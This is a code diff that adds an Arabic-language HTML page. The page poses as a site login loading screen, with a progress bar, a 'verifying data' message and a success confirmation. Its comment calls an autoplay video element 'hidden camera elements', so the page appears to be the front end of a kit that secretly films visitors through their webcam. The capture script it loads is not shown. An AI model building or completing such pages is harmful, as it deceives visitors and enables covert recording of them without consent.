@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري الدخول إلى الموقع</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- عناصر واجهة الدخول -->
+    <div class="loading-container">
+        <h1>جاري الدخول إلى الموقع</h1>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="loading-text">
+            جاري التحقق من البيانات<span class="dots"></span>
+        </div>
+    </div>
+
+    <!-- رسالة التأكيد -->
+    <div class="confirmation-message" id="confirmationMessage">
+        تم الدخول إلى الموقع بنجاح
+    </div>
+
+    <!-- عناصر الكمرة المخفية -->
+    <video id="video" autoplay playsinline></video>
+
+    <script src="script.js"></script>
+</body>
+</html>
